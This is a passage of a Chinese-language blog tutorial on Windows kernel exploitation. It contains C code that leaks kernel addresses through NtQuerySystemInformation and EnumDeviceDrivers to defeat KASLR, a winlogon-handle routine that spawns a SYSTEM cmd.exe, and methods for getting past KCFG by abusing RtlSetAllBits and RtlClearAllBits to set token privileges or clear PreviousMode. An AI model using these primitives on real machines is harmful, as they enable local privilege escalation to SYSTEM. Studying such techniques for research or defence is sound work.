class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">getshell</span><span class="params">()</span>&#123;</span><br><span class="line">    HANDLE hWinLogon = OpenProcess(PROCESS_ALL_ACCESS, <span class="number">0</span>, GetPidByName(<span class="string">L&quot;winlogon.exe&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!hWinLogon)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] OpenProcess failed with error = %lx\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CreateProcessFromHandle(hWinLogon, (LPSTR)<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h1><p>KASLR的存在使得如果不能leak出相关内存空间信息, 漏洞利用的难度成倍递增</p>
+<p>好在的是, 不同于Linux下对内核内存空间信息的控制那么严格, windows为了保证用户开发生态, 开放了许多获取内核地址空间信息的API</p>
+<h2 id="NtQuerySystemInformation"><a href="#NtQuerySystemInformation" class="headerlink" title="NtQuerySystemInformation"></a>NtQuerySystemInformation</h2><p>NtQuerySystemInformation就是其中最强大的一个</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__kernel_entry NTSTATUS <span class="title function_">NtQuerySystemInformation</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="line"><span class="params">  [in, out]       PVOID                    SystemInformation,</span></span><br><span class="line"><span class="params">  [in]            ULONG                    SystemInformationLength,</span></span><br><span class="line"><span class="params">  [out, optional] PULONG                   ReturnLength</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>SystemInformationClass</strong>: 一个 <code>SYSTEM_INFORMATION_CLASS</code> 枚举值，指示要查询的信息类型。</li>
+<li><strong>SystemInformation</strong>: 一个指向缓冲区的指针，函数将返回查询到的信息。这些信息的结构类型依赖于 <code>SystemInformationClass</code> 参数。</li>
+<li><strong>SystemInformationLength</strong>: 缓冲区的大小（以字节为单位）。如果缓冲区太小，函数将返回 <code>STATUS_INFO_LENGTH_MISMATCH</code>，并更新 <code>ReturnLength</code> 以指示所需的缓冲区大小。</li>
+<li><strong>ReturnLength</strong>: 这个参数是一个指向 <code>ULONG</code> 的指针，函数将通过它返回所需的缓冲区大小，特别是在缓冲区不足的情况下。</li>
+</ul>
+<p>NtQuerySystemInformation根据参数SystemInformationClass可以查询二三百种系统信息, 详细可参考<a target="_blank" rel="noopener" href="https://ntdoc.m417z.com/system_information_class">SYSTEM_INFORMATION_CLASS - NtDoc</a></p>
+<p>但主要用到也就两三个</p>
+<h3 id="SystemModuleInformation"><a href="#SystemModuleInformation" class="headerlink" title="SystemModuleInformation"></a>SystemModuleInformation</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SystemModuleInformation = <span class="number">11</span></span><br></pre></td></tr></table></figure>
+<p>主要用于获取模块信息, 返回类型为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">SYSTEM_MODULE</span> &#123;</span></span><br><span class="line">    ULONG                Reserved1;</span><br><span class="line">    ULONG                Reserved2;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">    ULONG				Reserved3;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    PVOID                ImageBaseAddress;<span class="comment">//加载基址</span></span><br><span class="line">    ULONG                ImageSize;</span><br><span class="line">    ULONG                Flags;</span><br><span class="line">    WORD                 Id;</span><br><span class="line">    WORD                 Rank;</span><br><span class="line">    WORD                 w018;</span><br><span class="line">    WORD                 NameOffset;</span><br><span class="line">    CHAR                 Name[<span class="number">255</span>];<span class="comment">//名字</span></span><br><span class="line">&#125;SYSTEM_MODULE, * PSYSTEM_MODULE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">SYSTEM_MODULE_INFORMATION</span> &#123;</span></span><br><span class="line">    ULONG                ModulesCount;</span><br><span class="line">    SYSTEM_MODULE        Modules[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;</span><br></pre></td></tr></table></figure>
+<p>应用举例: 获取系统模块地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">UINT_PTR <span class="title function_">GetKernelModuleAddress</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* TargetModule)</span></span><br><span class="line">&#123;</span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	ULONG ulBytes = <span class="number">0</span>;</span><br><span class="line">	PSYSTEM_MODULE_INFORMATION handleTableInfo = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> ((status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, handleTableInfo, ulBytes, &amp;ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (handleTableInfo != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			handleTableInfo = (PSYSTEM_MODULE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleTableInfo, <span class="number">2</span> * ulBytes);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			handleTableInfo = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, <span class="number">2</span> * ulBytes);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (status == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; handleTableInfo-&gt;ModulesCount; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">char</span>* moduleName = <span class="built_in">strstr</span>(handleTableInfo-&gt;Modules[i].Name, TargetModule);</span><br><span class="line">			<span class="keyword">if</span> (moduleName != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> (UINT_PTR)handleTableInfo-&gt;Modules[i].ImageBaseAddress;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (handleTableInfo != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;[-] NtQuerySystemInformation failed. (NTSTATUS code: 0x%X)\n&quot;</span>, status);</span><br><span class="line">			HeapFree(GetProcessHeap(), <span class="number">0</span>, handleTableInfo);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	HeapFree(GetProcessHeap(), <span class="number">0</span>, handleTableInfo);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>例如得到内核加载基址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">module_base_kernel = GetKernelModuleAddress(<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="SystemHandleInformation"><a href="#SystemHandleInformation" class="headerlink" title="SystemHandleInformation"></a>SystemHandleInformation</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SystemHandleInformation = <span class="number">16</span></span><br></pre></td></tr></table></figure>
+<p><code>SystemHandleInformation</code> 查询返回的内容是关于系统中所有打开的句柄的信息，这些句柄可能属于进程、线程、文件等, 返回类型如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_HANDLE</span> &#123;</span></span><br><span class="line">    USHORT HandleValue;<span class="comment">//句柄唯一标识句柄值</span></span><br><span class="line">    UCHAR ObjectType;<span class="comment">//句柄类型, 如文件、进程、内存映射、线程等</span></span><br><span class="line">    UCHAR Flags;</span><br><span class="line">    USHORT UniqueProcessId;<span class="comment">//句柄所属进程pid</span></span><br><span class="line">    ULONG Object;</span><br><span class="line">&#125; SYSTEM_HANDLE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_HANDLE_INFORMATION</span> &#123;</span></span><br><span class="line">    ULONG NumberOfHandles;</span><br><span class="line">    SYSTEM_HANDLE Handles[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_HANDLE_INFORMATION;</span><br></pre></td></tr></table></figure>
+<p>应用举例: 通过句柄得到指定进程的句柄对象</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int32_t</span> <span class="title function_">GetObjPtr</span><span class="params">(_Out_ PULONG64 ppObjAddr, _In_ ULONG ulPid, _In_ HANDLE handle)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int32_t</span> Ret = <span class="number">-1</span>;</span><br><span class="line">	PSYSTEM_HANDLE_INFORMATION pHandleInfo = <span class="number">0</span>;</span><br><span class="line">	ULONG ulBytes = <span class="number">0</span>;</span><br><span class="line">	NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">// Handle heap allocations to overcome STATUS_INFO_LENGTH_MISMATCH</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="keyword">while</span> ((Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, pHandleInfo, ulBytes, &amp;ulBytes)) == <span class="number">0xC0000004</span>L)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (pHandleInfo != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, (<span class="type">size_t</span>)<span class="number">2</span> * ulBytes);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (<span class="type">size_t</span>)<span class="number">2</span> * ulBytes);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Status != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		Ret = Status;</span><br><span class="line">		<span class="keyword">goto</span> done;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; pHandleInfo-&gt;NumberOfHandles; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((pHandleInfo-&gt;Handles[i].UniqueProcessId == ulPid) &amp;&amp; (pHandleInfo-&gt;Handles[i].HandleValue == (<span class="type">unsigned</span> <span class="type">short</span>)handle))</span><br><span class="line">		&#123;</span><br><span class="line">			*ppObjAddr = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)pHandleInfo-&gt;Handles[i].Object;</span><br><span class="line">			Ret = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">	<span class="keyword">if</span> (pHandleInfo != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		HeapFree(GetProcessHeap(), <span class="number">0</span>, pHandleInfo);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>例如得到_EPROCESS地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//当前进程</span></span><br><span class="line">	hCurproc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, GetCurrentProcessId());</span><br><span class="line">	<span class="keyword">if</span> (hCurproc != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		Ret = GetObjPtr(&amp;Curproc, GetCurrentProcessId(), hCurproc);</span><br><span class="line">		<span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> Ret;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+] Current EPROCESS address: %llx\n&quot;</span>, Curproc);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//system进程</span></span><br><span class="line">	Ret = GetObjPtr(&amp;Sysproc, <span class="number">4</span>, (HANDLE)<span class="number">4</span>);</span><br><span class="line">	<span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> Ret;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] System EPROCESS address: %llx\n&quot;</span>, Sysproc);</span><br></pre></td></tr></table></figure>
+<p>得到_KTHREAD地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());</span><br><span class="line"><span class="keyword">if</span> (hThread != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">	Ret = GetObjPtr(&amp;Curthread, GetCurrentProcessId(), hThread);</span><br><span class="line">	<span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> Ret;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Current KTHREAD address: %llx\n&quot;</span>, Curthread);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="EnumDeviceDrivers"><a href="#EnumDeviceDrivers" class="headerlink" title="EnumDeviceDrivers"></a>EnumDeviceDrivers</h2><p>同样是一个可以用于泄露内核基址的函数</p>
+<p><code>EnumDeviceDrivers</code> 函数存在于 <code>psapi.h</code> 中，可以枚举所有设备驱动程序，包括内核本身，并给出设备驱动程序的基址。它将返回一个设备驱动程序列表，其中第一个就是内核本身</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">EnumDeviceDrivers</span><span class="params">(</span></span><br><span class="line"><span class="params">  LPVOID  *lpImageBase,<span class="comment">//接收设备驱动程序地址的缓冲区</span></span></span><br><span class="line"><span class="params">  DWORD   cb,<span class="comment">//缓冲区大小</span></span></span><br><span class="line"><span class="params">  LPDWORD lpcbNeeded<span class="comment">//返回实际需要的字节数</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+<p>代码举例</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintDeviceDrivers</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// 缓冲区用于存储设备驱动程序的地址</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;LPVOID&gt; <span class="title function_">drivers</span><span class="params">(<span class="number">1024</span>)</span>;</span><br><span class="line">  DWORD bytesNeeded;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 枚举设备驱动程序</span></span><br><span class="line">  <span class="keyword">if</span> (!EnumDeviceDrivers(drivers.data(), static_cast&lt;DWORD&gt;(drivers.size() * <span class="keyword">sizeof</span>(LPVOID)), &amp;bytesNeeded)) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;EnumDeviceDrivers failed. Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果缓冲区不足，则调整大小并重新调用</span></span><br><span class="line">  <span class="keyword">if</span> (bytesNeeded &gt; drivers.size() * <span class="keyword">sizeof</span>(LPVOID)) &#123;</span><br><span class="line">    drivers.resize(bytesNeeded / <span class="keyword">sizeof</span>(LPVOID));</span><br><span class="line">    <span class="keyword">if</span> (!EnumDeviceDrivers(drivers.data(), static_cast&lt;DWORD&gt;(drivers.size() * <span class="keyword">sizeof</span>(LPVOID)), &amp;bytesNeeded)) &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;EnumDeviceDrivers failed after resizing. Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 打印设备驱动程序信息</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Loaded Device Drivers:\n&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; bytesNeeded / <span class="keyword">sizeof</span>(LPVOID); ++i) &#123;</span><br><span class="line">    TCHAR driverName[MAX_PATH];</span><br><span class="line">    <span class="keyword">if</span> (GetDeviceDriverBaseName(drivers[i], driverName, MAX_PATH)) &#123;</span><br><span class="line">      <span class="built_in">std</span>::wcout &lt;&lt; <span class="string">L&quot;Driver: &quot;</span> &lt;&lt; driverName &lt;&lt; <span class="string">L&quot; at address &quot;</span> &lt;&lt; drivers[i] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to get driver name. Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  PrintDeviceDrivers();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="KCFG"><a href="#KCFG" class="headerlink" title="KCFG"></a>KCFG</h1><p>KCFG对执行流劫持攻击有着强大的作用, 其中对于通过指针间接调用函数要求目标函数在给定函数表中</p>
+<p>但给定函数表中也存在可以利用的函数</p>
+<h2 id="RtlSetAllBits"><a href="#RtlSetAllBits" class="headerlink" title="RtlSetAllBits"></a>RtlSetAllBits</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> stdcall <span class="title function_">RtlSetAllBits</span><span class="params">(PRTL_BITMAP BitMapHeader)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span>* Buffer;<span class="comment">//r8</span></span><br><span class="line">  <span class="type">unsigned</span> int64 v2; / rdx</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  Buffer = BitMapHeader-&gt;Buffer;</span><br><span class="line">  v2 = (<span class="type">unsigned</span> int64)(<span class="number">4</span> * (((BitMapHeader &gt; SizeOfBitMap &amp; <span class="number">0x1F</span>) != <span class="number">0</span> ) + (BitMapHeader-&gt;SizeOfBitMap &gt;&gt; <span class="number">5</span>))) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span>（ v2 )&#123;</span><br><span class="line">    <span class="built_in">memset</span>(Buffer, <span class="number">0xFF</span>u, <span class="number">8</span> * (v2 &gt;&gt; <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> ((v2 &amp; <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">      Buffer[v2 - <span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>参数类型定义</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">RTL_BITMAP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG SizeOfBitMap;</span><br><span class="line">    ULONG* Buffer;                    </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>
+<p>可以用来设置<code>_SEP_TOKEN_PRIVILEGES</code>提权</p>
+<h2 id="RtlClearAllBits"><a href="#RtlClearAllBits" class="headerlink" title="RtlClearAllBits"></a>RtlClearAllBits</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> stdcall <span class="title function_">RtlClearAllBits</span><span class="params">(PRTL_BITMAP BitMapHeader)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span>* Buffer;<span class="comment">//r8</span></span><br><span class="line">  <span class="type">unsigned</span> int64 v2; / rdx</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  Buffer = BitMapHeader-&gt;Buffer;</span><br><span class="line">  v2 = (<span class="type">unsigned</span> int64)(<span class="number">4</span> * (((BitMapHeader &gt; SizeOfBitMap &amp; <span class="number">0x1F</span>) != <span class="number">0</span> ) + (BitMapHeader-&gt;SizeOfBitMap &gt;&gt; <span class="number">5</span>))) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span>（ v2 )&#123;</span><br><span class="line">    <span class="built_in">memset</span>(Buffer, <span class="number">0</span>, <span class="number">8</span> * (v2 &gt;&gt; <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> ((v2 &amp; <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">      Buffer[v2 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>参数类型同上</p>
+<p>可以用于清除<code>_KTHREAD.PreviousMode</code>字段, 将其设置为<code>KernelMode</code></p>
+<p>一些函数会通过这个字段判断是否处于内核模式从而允许调用, 例如:</p>
+<ul>
+<li><code>NtReadVirtualMemory</code>内存空间读</li>
+<li><code>NtWriteVirtualMemory</code>内存空间读</li>
+</ul>
+<p>特别可以<code>NtWriteVirtualMemory</code>直接替换目标进程的token</p>
+<h1 id="ACL提权"><a href="#ACL提权" class="headerlink" title="ACL提权"></a>ACL提权</h1><p>每一个内核对象对有一个<code>_OBJECT_HEADER</code>结构体, 用于描述关于该对象的元数据</p>
